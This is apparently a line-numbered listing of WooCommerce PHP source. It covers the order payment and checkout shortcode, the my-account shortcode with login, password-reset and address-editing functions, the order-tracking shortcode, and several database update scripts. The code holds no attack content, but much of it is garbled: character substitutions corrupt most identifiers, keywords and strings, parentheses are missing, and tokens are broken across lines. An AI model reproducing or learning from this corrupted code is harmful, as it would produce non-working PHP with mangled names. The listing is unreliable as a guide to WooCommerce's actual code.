$v®id_Üd”_¡©u£s
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_v®id_Üd”_¡©u£s_fÜ_·ym’t', 
	`¬¿y
Ğ'³ndšg', 'çed' ), 
$Üd”
 );

127 iàĞ
$Üd”
->
id
 =ğ
$Üd”_id
 && $Üd”->
Üd”_key
 =ğ
$Üd”_key
 ) {

129 iàĞ
	`š_¬¿y
Ğ
$Üd”
->
¡©us
, 
$v®id_Üd”_¡©u£s
 ) ) {

132 <
ul
 
şass
="order_details">

133 <
li
 
şass
="order">

134 <?
php
 
	`_e
( 'Order:', 'woocommerce' ); ?>

135 <
¡rÚg
><?
php
 
echo
 
$Üd”
->
	`g‘_Üd”_numb”
(); ?></strong>

136 </
li
>

137 <
li
 
şass
="date">

138 <?
php
 
	`_e
( 'Date:', 'woocommerce' ); ?>

139 <
¡rÚg
><?
php
 
echo
 
	`d©e_i18n
(
	`g‘_İtiÚ
('d©e_fÜm©'), 
	`¡¹Ùime
(
$Üd”
->
Üd”_d©e
)); ?></strong>

140 </
li
>

141 <
li
 
şass
="total">

142 <?
php
 
	`_e
( 'Total:', 'woocommerce' ); ?>

143 <
¡rÚg
><?
php
 
echo
 
$Üd”
->
	`g‘_fÜm©‹d_Üd”_tÙ®
(); ?></strong>

144 </
li
>

145 <?
php
 ià(
$Üd”
->
·ym’t_m‘hod_t™Ë
) : ?>

146 <
li
 
şass
="method">

147 <?
php
 
	`_e
( 'Payment method:', 'woocommerce' ); ?>

148 <
¡rÚg
><?
php


149 
echo
 
$Üd”
->
·ym’t_m‘hod_t™Ë
;

150 ?></
¡rÚg
>

151 </
li
>

152 <?
php
 
’dif
; ?>

153 </
ul
>

155 <?
php
 
	`do_aùiÚ
Ğ'woocomm”û_»ût_' . 
$Üd”
->
·ym’t_m‘hod
, 
$Üd”_id
 ); ?>

157 <
div
 
şass
="clear"></div>

158 <?
php


162 
$¡©us
 = 
	`g‘_‹rm_by
('¦ug', 
$Üd”
->
¡©us
, 'shop_order_status');

164 
	`wc_add_nÙiû
Ğ
	`¥rštf
Ğ
	`__
Ğ'Thi Üd”&rsquo; ¡©u i &ldquo;%s&rdquo;&mdash;™ cªnÙ b·id fÜ. PËa£ cÚù u iàyou‚“d‡ssi¡ªû.', 'woocomm”û' ), 
$¡©us
->
Çme
 ), 'error' );

168 
	`wc_add_nÙiû
Ğ
	`__
( 'Sorry,his order is invalid‡nd cannot be…aid for.', 'woocommerce' ), 'error' );

172 
	`wc_add_nÙiû
Ğ
	`__
( 'Invalid order.', 'woocommerce' ), 'error' );

175 
	`wc_´št_nÙiûs
();

177 
	`do_aùiÚ
( 'after_woocommerce_pay' );

178 
	}
}

183 
´iv©e
 
funùiÚ
 
	$Üd”_»ûived
Ğ
$Üd”_id
 = 0 ) {

185 
	`wc_´št_nÙiûs
();

187 
$Üd”
 = 
çl£
;

190 
$Üd”_id
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_thªkyou_Üd”_id', 
	`absšt
( $order_id ) );

191 
$Üd”_key
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_thªkyou_Üd”_key', 
	`em±y
Ğ
$_GET
['key'] ) ? '' : 
	`wc_ş—n
( $_GET['key'] ) );

193 iàĞ
$Üd”_id
 > 0 ) {

194 
$Üd”
 = 
Ãw
 
	`WC_Ord”
Ğ
$Üd”_id
 );

195 iàĞ
$Üd”
->
Üd”_key
 !ğ
$Üd”_key
 )

196 
	`un£t
Ğ
$Üd”
 );

200 
	`un£t
Ğ
	`WC
()->
£ssiÚ
->
Üd”_awa™šg_·ym’t
 );

202 
	`wc_g‘_‹m¶©e
Ğ'checkout/thªkyou.php', 
	`¬¿y
Ğ'Üd”' => 
$Üd”
 ) );

203 
	}
}

208 
´iv©e
 
funùiÚ
 
	$checkout
() {

211 
	`wc_´št_nÙiûs
();

214 iàĞĞ
	`WC
()->
ÿ¹
->
	`g‘_ÿ¹
() ) == 0 )

218 
	`WC
()->
ÿ¹
->
	`ÿlcuÏ‹_tÙ®s
();

221 
	`do_aùiÚ
('woocommerce_check_cart_items');

224 
$checkout
 = 
	`WC
()->
	`checkout
();

226 iàĞ
	`em±y
Ğ
$_POST
 ) && 
	`wc_nÙiû_couÁ
( 'error' ) > 0 ) {

228 
	`wc_g‘_‹m¶©e
Ğ'checkout/ÿ¹-”rÜs.php', 
	`¬¿y
Ğ'checkout' => 
$checkout
 ) );

232 
$nÚ_js_checkout
 = ! 
	`em±y
Ğ
$_POST
['woocomm”û_checkout_upd©e_tÙ®s'] ) ? 
Œue
 : 
çl£
;

234 iàĞ
	`wc_nÙiû_couÁ
Ğ'”rÜ' ) =ğ0 && 
$nÚ_js_checkout
 )

235 
	`wc_add_nÙiû
Ğ
	`__
( 'The orderotals have been updated. Please confirm your order by…ressinghe Place Order button‡the bottom ofhe…age.', 'woocommerce' ) );

237 
	`wc_g‘_‹m¶©e
Ğ'checkout/fÜm-checkout.php', 
	`¬¿y
Ğ'checkout' => 
$checkout
 ) );

240 
	}
}

	@includes/shortcodes/class-wc-shortcode-my-account.php

1 <?
php


12 şas 
	cWC_ShÜtcode_My_AccouÁ
 {

21 
public
 
funùiÚ
 
	$g‘
Ğ
$©ts
 ) {

22  
WC_ShÜtcodes
::
	`shÜtcode_w¿µ”
Ğ
	`¬¿y
Ğ
__CLASS__
, 'ouut' ), 
$©ts
 );

32 
public
 
funùiÚ
 
	$ouut
Ğ
$©ts
 ) {

33 
glob®
 
$woocomm”û
, 
$wp
;

36 iàĞ
	`is_nuÎ
Ğ
	`WC
()->
ÿ¹
 ) ) {

40 iàĞ! 
	`is_u£r_logged_š
() ) {

42 
$mes§ge
 = 
	`­¶y_f‹rs
( 'woocommerce_my_account_message', '' );

44 iàĞ! 
	`em±y
Ğ
$mes§ge
 ) ) {

45 
	`wc_add_nÙiû
Ğ
$mes§ge
 );

48 iàĞ
	`is£t
Ğ
$wp
->
qu”y_v¬s
['lost-password'] ) ) {

50 
£lf
::
	`lo¡_·sswÜd
();

54 
	`wc_g‘_‹m¶©e
( 'myaccount/form-login.php' );

60 iàĞ! 
	`em±y
Ğ
$wp
->
qu”y_v¬s
['view-order'] ) ) {

62 
£lf
::
	`v›w_Üd”
Ğ
	`absšt
Ğ
$wp
->
qu”y_v¬s
['view-order'] ) );

64 } 
	`–£if
 ( 
	`is£t
Ğ
$wp
->
qu”y_v¬s
['edit-account'] ) ) {

66 
£lf
::
	`ed™_accouÁ
();

68 } 
	`–£if
 ( 
	`is£t
Ğ
$wp
->
qu”y_v¬s
['edit-address'] ) ) {

70 
£lf
::
	`ed™_add»ss
Ğ
	`§n™ize_t™Ë
Ğ
$wp
->
qu”y_v¬s
['edit-address'] ) );

72 } 
	`–£if
 ( 
	`is£t
Ğ
$wp
->
qu”y_v¬s
['add-payment-method'] ) ) {

74 
£lf
::
	`add_·ym’t_m‘hod
Ğ
$wp
->
qu”y_v¬s
['add-payment-method'] );

78 
£lf
::
	`my_accouÁ
Ğ
$©ts
 );

82 
	}
}

89 
´iv©e
 
funùiÚ
 
	$my_accouÁ
Ğ
$©ts
 ) {

90 
	`exŒaù
Ğ
	`shÜtcode_©ts
Ğ
	`¬¿y
(

92 ), 
$©ts
 ) );

94 
	`wc_g‘_‹m¶©e
Ğ'myaccouÁ/my-accouÁ.php', 
	`¬¿y
(

95 'cu¼’t_u£r' => 
	`g‘_u£r_by
Ğ'id', 
	`g‘_cu¼’t_u£r_id
() ),

96 'Üd”_couÁ' => '®l' =ğ
$Üd”_couÁ
 ? -1 : $order_count

98 
	}
}

105 
´iv©e
 
funùiÚ
 
	$v›w_Üd”
Ğ
$Üd”_id
 ) {

107 
$u£r_id
 = 
	`g‘_cu¼’t_u£r_id
();

108 
$Üd”
 = 
Ãw
 
	`WC_Ord”
Ğ
$Üd”_id
 );

110 iàĞ! 
	`cu¼’t_u£r_ÿn
Ğ'v›w_Üd”', 
$Üd”_id
 ) ) {

111 
echo
 '<div cÏss="woocomm”û-”rÜ">' . 
	`__
Ğ'Inv®id ord”.', 'woocomm”û' ) . ' <¨h»f="' . 
	`g‘_³rm®šk
Ğ
	`wc_g‘_·ge_id
( 'myaccount' ) ).'" class="wc-forward">'. __( 'My Account', 'woocommerce' ) .'</a>' . '</div>';

115 
	`wc_g‘_‹m¶©e
Ğ'myaccouÁ/v›w-Üd”.php', 
	`¬¿y
(

116 '¡©us' => 
	`g‘_‹rm_by
Ğ'¦ug', 
$Üd”
->
¡©us
, 'shop_order_status' ),

117 'Üd”' => 
Ãw
 
	`WC_Ord”
Ğ
$Üd”_id
 ),

118 'Üd”_id' => 
$Üd”_id


120 
	}
}

125 
´iv©e
 
funùiÚ
 
	$ed™_accouÁ
() {

126 
	`wc_g‘_‹m¶©e
Ğ'myaccouÁ/fÜm-ed™-accouÁ.php', 
	`¬¿y
Ğ'u£r' => 
	`g‘_u£r_by
Ğ'id', 
	`g‘_cu¼’t_u£r_id
() ) ) );

127 
	}
}

135 
´iv©e
 
funùiÚ
 
ed™_add»ss
Ğ
$lßd_add»ss
 = 'billing' ) {

138 
glob®
 
$cu¼’t_u£r
;

139 
g‘_cu¼’tu£ršfo
();

141 
	g$lßd_add»ss
 = 
§n™ize_key
Ğ
$lßd_add»ss
 );

143 
	g$add»ss
 = 
WC
()->
couÁr›s
->
g‘_add»ss_f›lds
Ğ
g‘_u£r_m‘a
Ğ
g‘_cu¼’t_u£r_id
(), 
$lßd_add»ss
 . '_couÁry', 
Œue
 ), $load_address . '_' );

146 
wp_’queue_süt
( 'wc-country-select' );

147 
wp_’queue_süt
( 'wc-address-i18n' );

150 
fÜ—ch
 ( 
$add»ss
 
as
 
$key
 => 
$f›ld
 ) {

152 
$v®ue
 = 
g‘_u£r_m‘a
Ğ
g‘_cu¼’t_u£r_id
(), 
$key
, 
Œue
 );

154 iàĞ! 
	g$v®ue
 ) {

155  
	g$key
 ) {

158 
$v®ue
 = 
$cu¼’t_u£r
->
u£r_ema
;

162 
$v®ue
 = 
WC
()->
couÁr›s
->
g‘_ba£_couÁry
();

166 
$v®ue
 = 
WC
()->
couÁr›s
->
g‘_ba£_¡©e
();

171 
	g$add»ss
[ 
$key
 ]['v®ue'] = 
­¶y_f‹rs
Ğ'woocomm”û_my_accouÁ_ed™_add»ss_f›ld_v®ue', 
$v®ue
, $key, 
$lßd_add»ss
 );

174 
wc_g‘_‹m¶©e
Ğ'myaccouÁ/fÜm-ed™-add»ss.php', 
¬¿y
(

175 'lßd_add»ss' => 
$lßd_add»ss
,

176 'add»ss' => 
­¶y_f‹rs
Ğ'woocomm”û_add»ss_to_ed™', 
$add»ss
 )

183 
public
 
funùiÚ
 
	$lo¡_·sswÜd
() {

185 
glob®
 
$po¡
;

188 
$¬gs
 = 
	`¬¿y
( 'form' => 'lost_password' );

191 iàĞ
	`is£t
Ğ
$_GET
['key'] ) && isset( $_GET['login'] ) ) {

193 
$u£r
 = 
£lf
::
	`check_·sswÜd_»£t_key
Ğ
$_GET
['key'], $_GET['login'] );

196 ifĞ
	`is_objeù
Ğ
$u£r
 ) ) {

197 
$¬gs
['form'] = 'reset_password';

198 
$¬gs
['key'] = 
	`esc_©Œ
Ğ
$_GET
['key'] );

199 
$¬gs
['logš'] = 
	`esc_©Œ
Ğ
$_GET
['login'] );

201 } 
	`–£if
 ( 
	`is£t
Ğ
$_GET
['reset'] ) ) {

202 
	`wc_add_nÙiû
Ğ
	`__
Ğ'You¸·sswÜd ha b“À»£t.', 'woocomm”û' ) . ' <¨h»f="' . 
	`g‘_³rm®šk
Ğ
	`wc_g‘_·ge_id
( 'myaccount' ) ) . '">' . __( 'Log in', 'woocommerce' ) . '</a>' );

205 
	`wc_g‘_‹m¶©e
Ğ'myaccouÁ/fÜm-lo¡-·sswÜd.php', 
$¬gs
 );

206 
	}
}

215 
public
 
funùiÚ
 
	$»Œ›ve_·sswÜd
() {

216 
glob®
 
$woocomm”û
,
$wpdb
;

218 iàĞ
	`em±y
Ğ
$_POST
['user_login'] ) ) {

220 
	`wc_add_nÙiû
Ğ
	`__
( 'Enter‡ username orƒ-mail‡ddress.', 'woocommerce' ), 'error' );

222 } 
	`–£if
 ( 
	`¡½os
Ğ
$_POST
['u£r_logš'], '@' ) && 
	`­¶y_f‹rs
Ğ'woocomm”û_g‘_u£ºame_äom_ema', 
Œue
 ) ) {

224 
$u£r_d©a
 = 
	`g‘_u£r_by
Ğ'ema', 
	`Œim
Ğ
$_POST
['user_login'] ) );

226 iàĞ
	`em±y
Ğ
$u£r_d©a
 ) )

227 
	`wc_add_nÙiû
Ğ
	`__
( 'There is‚o user„egistered withhatƒmail‡ddress.', 'woocommerce' ), 'error' );

231 
$logš
 = 
	`Œim
Ğ
$_POST
['user_login'] );

233 
$u£r_d©a
 = 
	`g‘_u£r_by
Ğ'logš', 
$logš
 );

236 
	`do_aùiÚ
('lostpassword_post');

238 ifĞ
	`wc_nÙiû_couÁ
( 'error' ) > 0 )

239  
çl£
;

241 iàĞ! 
$u£r_d©a
 ) {

242 
	`wc_add_nÙiû
Ğ
	`__
( 'Invalid username orƒ-mail.', 'woocommerce' ), 'error' );

243  
çl£
;

247 
$u£r_logš
 = 
$u£r_d©a
->
u£r_logš
;

248 
$u£r_ema
 = 
$u£r_d©a
->
u£r_ema
;

250 
	`do_aùiÚ
('»Œ›ve_·sswÜd', 
$u£r_logš
);

252 
$®low
 = 
	`­¶y_f‹rs
('®low_·sswÜd_»£t', 
Œue
, 
$u£r_d©a
->
ID
);

254 iàĞ! 
$®low
 ) {

256 
	`wc_add_nÙiû
Ğ
	`__
( 'Password„eset is‚ot‡llowed forhis user', 'woocommerce' ), 'error' );

258  
çl£
;

260 } 
	`–£if
 ( 
	`is_wp_”rÜ
Ğ
$®low
 ) ) {

262 
	`wc_add_nÙiû
Ğ
$®low
->
g‘_”rÜ_mes§ge
, 'error' );

264  
çl£
;

267 
$key
 = 
$wpdb
->
	`g‘_v¬
Ğ$wpdb->
	`´•¬e
Ğ"SELECT u£r_aùiv©iÚ_key FROM $wpdb->u£r WHERE u£r_logš = %s", 
$u£r_logš
 ) );

269 iàĞ
	`em±y
Ğ
$key
 ) ) {

272 
$key
 = 
	`wp_g’”©e_·sswÜd
Ğ20, 
çl£
 );

274 
	`do_aùiÚ
('»Œ›ve_·sswÜd_key', 
$u£r_logš
, 
$key
);

277 
$wpdb
->
	`upd©e
Ğ$wpdb->
u£rs
, 
	`¬¿y
Ğ'u£r_aùiv©iÚ_key' => 
$key
 ),‡¼ayĞ'u£r_logš' => 
$u£r_logš
 ) );

281 
$ma”
 = 
	`WC
()->
	`ma”
();

282 
	`do_aùiÚ
Ğ'woocomm”û_»£t_·sswÜd_nÙifiÿtiÚ', 
$u£r_logš
, 
$key
 );

284 
	`wc_add_nÙiû
Ğ
	`__
( 'Check yourƒ-mail forhe confirmation†ink.', 'woocommerce' ) );

285  
Œue
;

286 
	}
}

298 
public
 
funùiÚ
 
	$check_·sswÜd_»£t_key
Ğ
$key
, 
$logš
 ) {

299 
glob®
 
$woocomm”û
,
$wpdb
;

301 
$key
 = 
	`´eg_»¶aû
( '/[^a-z0-9]/i', '', $key );

303 iàĞ
	`em±y
Ğ
$key
 ) || ! 
	`is_¡ršg
( $key ) ) {

304 
	`wc_add_nÙiû
Ğ
	`__
( 'Invalid key', 'woocommerce' ), 'error' );

305  
çl£
;

308 iàĞ
	`em±y
Ğ
$logš
 ) || ! 
	`is_¡ršg
( $login ) ) {

309 
	`wc_add_nÙiû
Ğ
	`__
( 'Invalid key', 'woocommerce' ), 'error' );

310  
çl£
;

313 
$u£r
 = 
$wpdb
->
	`g‘_row
Ğ$wpdb->
	`´•¬e
Ğ"SELECT * FROM $wpdb->u£r WHERE u£r_aùiv©iÚ_key = % AND u£r_logš = %s", 
$key
, 
$logš
 ) );

315 iàĞ
	`em±y
Ğ
$u£r
 ) ) {

316 
	`wc_add_nÙiû
Ğ
	`__
( 'Invalid key', 'woocommerce' ), 'error' );

317  
çl£
;

320  
$u£r
;

321 
	}
}

331 
public
 
funùiÚ
 
	$»£t_·sswÜd
Ğ
$u£r
, 
$Ãw_·ss
 ) {

332 
	`do_aùiÚ
Ğ'·sswÜd_»£t', 
$u£r
, 
$Ãw_·ss
 );

334 
	`wp_£t_·sswÜd
Ğ
$Ãw_·ss
, 
$u£r
->
ID
 );

336 
	`wp_·sswÜd_chªge_nÙifiÿtiÚ
Ğ
$u£r
 );

337 
	}
}

342 
´iv©e
 
funùiÚ
 
	$add_·ym’t_m‘hod
() {

344 iàĞ! 
	`is_u£r_logged_š
() ) {

346 
	`wp_§ã_»dœeù
Ğ
	`g‘_³rm®šk
Ğ
	`wc_g‘_·ge_id
( 'myaccount' ) ) );

347 
	`ex™
();

351 
	`do_aùiÚ
( 'before_woocommerce_add_payment_method' );

353 
	`wc_add_nÙiû
Ğ
	`__
( 'Add‡‚ew…ayment method.', 'woocommerce' ), 'notice' );

355 
	`wc_´št_nÙiûs
();

358 
	`wc_g‘_‹m¶©e
( 'myaccount/form-add-payment-method.php' );

360 
	`wc_´št_nÙiûs
();

362 
	`do_aùiÚ
( 'after_woocommerce_add_payment_method' );

366 
	}
}

	@includes/shortcodes/class-wc-shortcode-order-tracking.php

1 <?
php


13 şas 
	cWC_ShÜtcode_Ord”_T¿ckšg
 {

22 
public
 
funùiÚ
 
	$g‘
Ğ
$©ts
 ) {

23  
WC_ShÜtcodes
::
	`shÜtcode_w¿µ”
Ğ
	`¬¿y
Ğ
__CLASS__
, 'ouut' ), 
$©ts
 );

33 
public
 
funùiÚ
 
	$ouut
Ğ
$©ts
 ) {

36 iàĞ
	`is_nuÎ
Ğ
	`WC
()->
ÿ¹
 ) ) {

40 
	`exŒaù
(
	`shÜtcode_©ts
(
	`¬¿y
(

41 ), 
$©ts
));

43 
glob®
 
$po¡
;

45 iàĞ! 
	`em±y
Ğ
$_REQUEST
['orderid'] ) ) {

47 
	`wp_v”ify_nÚû
Ğ
$_POST
['_wpnonce'], 'woocommerce-order_tracking' );

49 
$Üd”_id
 = 
	`em±y
Ğ
$_REQUEST
['Üd”id'] ) ? 0 : 
	`esc_©Œ
( $_REQUEST['orderid'] );

50 
$Üd”_ema
 = 
	`em±y
Ğ
$_REQUEST
['Üd”_ema'] ) ? '' : 
	`esc_©Œ
( $_REQUEST['order_email']) ;

52 iàĞ! 
$Üd”_id
 ) {

54 
echo
 '<°şass="woocomm”û-”rÜ">' . 
	`__
( 'Pleaseƒnter‡ valid order ID', 'woocommerce' ) . '</p>';

56 } 
	`–£if
 ( ! 
$Üd”_ema
 ) {

58 
echo
 '<°şass="woocomm”û-”rÜ">' . 
	`__
( 'Pleaseƒnter‡ valid orderƒmail', 'woocommerce' ) . '</p>';

62 
$Üd”
 = 
Ãw
 
	`WC_Ord”
Ğ
	`­¶y_f‹rs
Ğ'woocomm”û_shÜtcode_Üd”_Œackšg_Üd”_id', 
$Üd”_id
 ) );

64 iàĞ
$Üd”
->
id
 && 
$Üd”_ema
 ) {

66 iàĞ
	`¡¹Şow”
Ğ
$Üd”
->
blšg_ema
 ) =ğ¡¹Şow”Ğ
$Üd”_ema
 ) ) {

67 
	`do_aùiÚ
Ğ'woocomm”û_Œack_Üd”', 
$Üd”
->
id
 );

68 
	`wc_g‘_‹m¶©e
Ğ'Üd”/Œackšg.php', 
	`¬¿y
(

69 'Üd”' => 
$Üd”


77 
echo
 '<°şass="woocomm”û-”rÜ">' . 
	`¥rštf
Ğ
	`__
Ğ'SÜry, wcould‚Ù fšdh© ord” id iÀou¸d©aba£.', 'woocomm”û' ), 
	`g‘_³rm®šk
(
$po¡
->
ID
 ) ) . '</p>';

85 
	`wc_g‘_‹m¶©e
( 'order/form-tracking.php' );

86 
	}
}

	@includes/updates/woocommerce-update-1.4.php

1 <?
php


11 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

13 
glob®
 
	g$wpdb
, 
	g$woocomm”û
;

16 
	g$dowÆßdabË_ty³
 = 
g‘_‹rm_by
( 'slug', 'downloadable', 'product_type' );

17 iàĞ
	g$dowÆßdabË_ty³
 ) {

18 
	g$´oduùs
 = 
g‘_objeùs_š_‹rm
Ğ
$dowÆßdabË_ty³
->
‹rm_id
, 'product_type' );

19 
fÜ—ch
 ( 
$´oduùs
 
as
 
$´oduù
 ) {

20 
upd©e_po¡_m‘a
Ğ
$´oduù
, '_downloadable', 'yes' );

21 
upd©e_po¡_m‘a
Ğ
$´oduù
, '_virtual', 'yes' );

22 
wp_£t_objeù_‹rms
Ğ
$´oduù
, 'simple', 'product_type');

26 
	g$vœtu®_ty³
 = 
g‘_‹rm_by
( 'slug', 'virtual', 'product_type' );

27 iàĞ
	g$vœtu®_ty³
 ) {

28 
	g$´oduùs
 = 
g‘_objeùs_š_‹rm
Ğ
$vœtu®_ty³
->
‹rm_id
, 'product_type' );

29 
fÜ—ch
 ( 
$´oduùs
 
as
 
$´oduù
 ) {

30 
upd©e_po¡_m‘a
Ğ
$´oduù
, '_downloadable', 'no' );

31 
upd©e_po¡_m‘a
Ğ
$´oduù
, '_virtual', 'yes' );

32 
wp_£t_objeù_‹rms
Ğ
$´oduù
, 'simple', 'product_type');

	@includes/updates/woocommerce-update-1.5.php

1 <?
php


11 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

13 
glob®
 
	g$wpdb
, 
	g$woocomm”û
;

16 
	g$»suÉs
 = 
$wpdb
->
g‘_»suÉs
( "SELECT * FROM {$wpdb->prefix}woocommerce_downloadable_product_permissions WHERE order_id = 0;" );

18 iàĞ
	g$»suÉs
 ) 
	$fÜ—ch
 ( 
$»suÉs
 
as
 
$»suÉ
 ) {

20 iàĞ! 
$»suÉ
->
Üd”_key
 )

23 
$Üd”_id
 = 
$wpdb
->
	`g‘_v¬
Ğ$wpdb->
	`´•¬e
Ğ"SELECT…o¡_id FROM {$wpdb->po¡m‘a} WHERE m‘a_key = '_Üd”_key' AND m‘a_v®uğ'%s' LIMIT 1;", 
$»suÉ
->
Üd”_key
 ) );

25 iàĞ
$Üd”_id
 ) {

27 
$wpdb
->
	`upd©e
Ğ$wpdb->
´efix
 . "woocomm”û_dowÆßdabË_´oduù_³rmissiÚs", 
	`¬¿y
(

28 'Üd”_id' => 
$Üd”_id
,

29 ), 
	`¬¿y
(

30 '´oduù_id' => 
$»suÉ
->
´oduù_id
,

31 'Üd”_key' => 
$»suÉ
->
Üd”_key


32 ), 
	`¬¿y
( '%s' ),‡rray( '%s', '%s' ) );

36 
	}
}

39 
	g$m‘a
 = 
¬¿y
( 'sku', 'downloadable', 'virtual', 'price', 'visibility', 'stock', 'stock_status', 'backorders', 'manage_stock', 'sale_price', 'regular_price', 'weight', 'length', 'width', 'height', 'tax_status', 'tax_class', 'upsell_ids', 'crosssell_ids', 'sale_price_dates_from', 'sale_price_dates_to', 'min_variation_price', 'max_variation_price', 'featured', 'product_attributes', 'file_path', 'download_limit', 'product_url', 'min_variation_price', 'max_variation_price' );

41 
	g$wpdb
->
qu”y
( "

42 
UPDATE
 {
$wpdb
->
po¡m‘a
}

43 
LEFT
 
JOIN
 {
$wpdb
->
po¡s
} 
ON
 ( {$wpdb->
po¡m‘a
}.
po¡_id
 = {$wpdb->po¡s}.
ID
 )

44 
SET
 
m‘a_key
 = 
CONCAT
( '_', meta_key )

45 
WHERE
 
m‘a_key
 
IN
 ( '" . implode( "', '", $meta ) . "' )

46 
AND
 {
$wpdb
->
po¡s
}.
po¡_ty³
 
IN
 ('product', 'product_variation')

	@includes/updates/woocommerce-update-2.0.9.php

1 <?
php


11 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

13 
glob®
 
	g$wpdb
, 
	g$woocomm”û
;

16 
	g$wpdb
->
upd©e
(

17 
$wpdb
->
po¡m‘a
,

18 
¬¿y
(

21 
¬¿y
(

26 
	g$wpdb
->
upd©e
(

27 
$wpdb
->
po¡m‘a
,

28 
¬¿y
(

31 
¬¿y
(

36 
	g$wpdb
->
upd©e
(

37 
$wpdb
->
u£rm‘a
,

38 
¬¿y
(

41 
¬¿y
(

46 
	g$wpdb
->
upd©e
(

47 
$wpdb
->
u£rm‘a
,

48 
¬¿y
(

51 
¬¿y
(

	@includes/updates/woocommerce-update-2.0.php

1 <?
php


11 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

13 
glob®
 
	g$wpdb
, 
	g$woocomm”û
;

16 
	g$exi¡šg_fe_·ths
 = 
$wpdb
->
g‘_»suÉs
( "SELECT * FROM {$wpdb->postmeta} WHERE meta_key = '_file_path' AND meta_value != '';" );

18 iàĞ
	g$exi¡šg_fe_·ths
 ) {

20 
fÜ—ch
Ğ
$exi¡šg_fe_·ths
 
as
 
$exi¡šg_fe_·th
 ) {

22 
	g$Şd_fe_·th
 = 
Œim
Ğ
$exi¡šg_fe_·th
->
m‘a_v®ue
 );

24 iàĞ! 
em±y
Ğ
$Şd_fe_·th
 ) ) {

25 
	g$fe_·ths
 = 
£rŸlize
Ğ
¬¿y
Ğ
md5
Ğ
$Şd_fe_·th
 ) => $old_file_path ) );

27 
	g$wpdb
->
qu”y
Ğ
$wpdb
->
´•¬e
Ğ"UPDATE {$wpdb->po¡m‘a} SET m‘a_key = '_fe_·ths', m‘a_v®uğ% WHERE m‘a_id = %d", 
$fe_·ths
, 
$exi¡šg_fe_·th
->
m‘a_id
 ) );

29 
	g$wpdb
->
qu”y
Ğ
$wpdb
->
´•¬e
Ğ"UPDATE {$wpdb->´efix}woocomm”û_dowÆßdabË_´oduù_³rmissiÚ SET dowÆßd_id = % WHERE…roduù_id = %d", 
md5
Ğ
$Şd_fe_·th
 ), 
$exi¡šg_fe_·th
->
po¡_id
 ) );

36 
	g$³rm®šks
 = 
g‘_İtiÚ
( 'woocommerce_permalinks' );

37 
	g$shİ_·ge_id
 = 
wc_g‘_·ge_id
( 'shop' );

39 iàĞ
em±y
Ğ
$³rm®šks
 ) && 
	g$shİ_·ge_id
 > 0 ) {

41 
	g$ba£_¦ug
 = 
$shİ_·ge_id
 > 0 && 
g‘_·ge
Ğ$shİ_·ge_id ) ? 
g‘_·ge_uri
( $shop_page_id ) : 'shop';

43 
	g$ÿ‹gÜy_ba£
 = 
g‘_İtiÚ
('woocomm”û_´•’d_shİ_·ge_to_u¾s'è=ğ"yes" ? 
Œašg¦ash™
Ğ
$ba£_¦ug
 ) : '';

44 
	g$ÿ‹gÜy_¦ug
 = 
g‘_İtiÚ
('woocomm”û_´oduù_ÿ‹gÜy_¦ug'è? g‘_İtiÚ('woocomm”û_´oduù_ÿ‹gÜy_¦ug'è: 
_x
( 'product-category', 'slug', 'woocommerce' );

45 
	g$g_¦ug
 = 
g‘_İtiÚ
('woocomm”û_´oduù_g_¦ug'è? g‘_İtiÚ('woocomm”û_´oduù_g_¦ug'è: 
_x
( 'product-tag', 'slug', 'woocommerce' );

47 iàĞ'yes' =ğ
g‘_İtiÚ
('woocommerce_prepend_shop_page_to_products') ) {

48 
$´oduù_ba£
 = 
Œašg¦ash™
Ğ
$ba£_¦ug
 );

50 iàĞĞ
	g$´oduù_¦ug
 = 
g‘_İtiÚ
('woocomm”û_´oduù_¦ug'èè!=ğ
çl£
 && ! 
em±y
Ğ
$´oduù_¦ug
 ) ) {

51 
$´oduù_ba£
 = 
Œašg¦ash™
Ğ
$´oduù_¦ug
 );

53 
	g$´oduù_ba£
 = 
Œašg¦ash™
Ğ
_x
('product', 'slug', 'woocommerce') );

57 iàĞ
g‘_İtiÚ
('woocommerce_prepend_category_to_products') == 'yes' )

58 
$´oduù_ba£
 .ğ
Œašg¦ash™
('%product_cat%');

60 
	g$³rm®šks
 = 
¬¿y
(

61 '´oduù_ba£' => 
uÁ¿šg¦ash™
Ğ
$´oduù_ba£
 ),

62 'ÿ‹gÜy_ba£' => 
uÁ¿šg¦ash™
Ğ
$ÿ‹gÜy_ba£
 . 
$ÿ‹gÜy_¦ug
 ),

63 '©Œibu‹_ba£' => 
uÁ¿šg¦ash™
Ğ
$ÿ‹gÜy_ba£
 ),

64 'g_ba£' => 
uÁ¿šg¦ash™
Ğ
$ÿ‹gÜy_ba£
 . 
$g_¦ug
 )

67 
upd©e_İtiÚ
Ğ'woocomm”û_³rm®šks', 
$³rm®šks
 );

71 iàĞ
g‘_İtiÚ
( 'woocommerce_shop_show_subcategories' ) == 'yes' ) {

72 iàĞ
g‘_İtiÚ
( 'woocommerce_hide_products_when_showing_subcategories' ) == 'yes' ) {

73 
upd©e_İtiÚ
( 'woocommerce_shop_page_display', 'subcategories' );

75 
upd©e_İtiÚ
( 'woocommerce_shop_page_display', 'both' );

79 iàĞ
g‘_İtiÚ
( 'woocommerce_show_subcategories' ) == 'yes' ) {

80 iàĞ
g‘_İtiÚ
( 'woocommerce_hide_products_when_showing_subcategories' ) == 'yes' ) {

81 
upd©e_İtiÚ
( 'woocommerce_category_archive_display', 'subcategories' );

83 
upd©e_İtiÚ
( 'woocommerce_category_archive_display', 'both' );

88 
	g$loİ
 = 0;

89 
	g$x_¿‹s
 = 
g‘_İtiÚ
( 'woocommerce_tax_rates' );

91 iàĞ
	g$x_¿‹s
 )

92 
	$fÜ—ch
 ( 
$x_¿‹s
 
as
 
$x_¿‹
 ) {

94 
	`fÜ—ch
 ( 
$x_¿‹
['couÁr›s'] 
as
 
$couÁry
 => 
$¡©es
 ) {

96 
$¡©es
 = 
	`¬¿y_»v”£
( $states );

98 
	`fÜ—ch
 ( 
$¡©es
 
as
 
$¡©e
 ) {

100 iàĞ
$¡©e
 == '*' )

101 
$¡©e
 = '';

103 
$wpdb
->
	`š£¹
(

104 
$wpdb
->
´efix
 . "woocommerce_tax_rates",

105 
	`¬¿y
(

